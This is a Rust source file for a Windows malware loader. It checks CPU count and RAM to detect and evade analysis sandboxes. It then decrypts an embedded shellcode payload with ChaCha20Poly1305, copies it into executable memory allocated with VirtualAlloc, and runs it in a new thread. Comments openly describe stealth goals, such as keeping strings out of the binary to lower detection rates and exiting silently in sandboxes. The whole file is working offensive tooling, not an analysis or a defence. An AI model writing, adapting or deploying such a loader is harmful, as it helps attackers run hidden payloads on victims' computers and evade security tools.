use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce,
};
use std::process;
use std::ptr;
use sysinfo::{System, SystemExt};

// Base64 Engine
use base64::engine::Engine as _;
use base64::engine::general_purpose::STANDARD; 

// Windows Imports
use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};

// Payload Data
include!(concat!(env!("OUT_DIR"), "/payload_data.rs")); // build.rs generates this file because we need to keep the key/nonce secret

// --- Phase 0: Evasion Constants ---
const MIN_CPUS: usize = 4; 
const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB



fn run_evasion_checks() -> bool {
    // 1. CPU Core Check
    // We strictly avoid using 'eprintln' or 'println' here to ensure no debug strings 
    // are compiled into the final binary, which could act as signatures.
    let available_cpus = num_cpus::get();
    
    if available_cpus < MIN_CPUS {
        return false;
    }

    // 2. RAM Check
    let mut sys = System::new_all();
    sys.refresh_memory();
    let total_memory = sys.total_memory(); 

    if total_memory < MIN_RAM_BYTES {
        return false;
    }
    
    true
}

fn main() {

    // --- Phase 0: Evasion ---
    // This check must occur before any malicious action.
    if !run_evasion_checks() {
        // If a sandbox is detected, exit immediately and silently.
        process::exit(0); 
    }
    
    // --- Phase 1: Decryption ---
    
    // 1. Base64 Decoding
    // Decode the ciphertext string generated by the build script.
    let ciphertext_vec = match STANDARD.decode(ENCRYPTED_PAYLOAD_BASE64) {
        Ok(data) => data,
        Err(_) => process::exit(1), // Silent exit on error
    };
    
    // 2. ChaCha20 Setup
    // Initialize the cipher using the unique key and nonce from the build script.
    let key = Key::from_slice(&PAYLOAD_KEY);
    let nonce = Nonce::from_slice(&PAYLOAD_NONCE);
    let cipher = ChaCha20Poly1305::new(key);

    // 3. Decryption
    // Decrypt the actual shellcode.
    let decrypted_payload = match cipher.decrypt(nonce, ciphertext_vec.as_ref()) {
        Ok(data) => data,
        Err(_) => process::exit(1),
    };

    // REMOVED for Stealth: 
    // println!("[+] Stealth Mode active. Payload decrypted..."); 
    // Keeping strings out of the binary reduces detection rates.
    // --- Phase 3: Simple Execution ---
    
    unsafe {
        // 1. Allocate Memory
        // We request executable memory from the Windows OS.
        let base_addr = VirtualAlloc(
            ptr::null_mut(),            // Let Windows decide the address
            decrypted_payload.len(),    // Size of the payload
            MEM_COMMIT | MEM_RESERVE,   // Commit the memory immediately
            PAGE_EXECUTE_READWRITE      // CRITICAL: Permission to Read, Write, AND Execute
        );

        if base_addr.is_null() {
            // If allocation fails (e.g., OOM), exit silently.
            process::exit(1);
        }

        // 2. Copy Shellcode
        // Copy the decrypted bytes into the newly allocated executable memory region.
        ptr::copy_nonoverlapping(
            decrypted_payload.as_ptr(),
            base_addr as *mut u8,
            decrypted_payload.len()
        );

        // 3. Create Thread
        // Instruct Windows to spawn a new thread starting at the memory address of our shellcode.
        let thread_handle = CreateThread(
            ptr::null(),             // Default security attributes
            0,                       // Default stack size
            Some(std::mem::transmute(base_addr)), // Entry point (our shellcode)
            ptr::null(),             // No parameters
            0,                       // Start immediately
            ptr::null_mut()          // We don't need the Thread ID
        );

        if thread_handle == 0 {
            process::exit(1);
        }

        // 4. Wait for Completion
        // We must wait for the shellcode thread to finish (or run indefinitely).
        // Otherwise, the main process would exit, killing the shellcode thread.
        WaitForSingleObject(thread_handle, INFINITE);
    }
}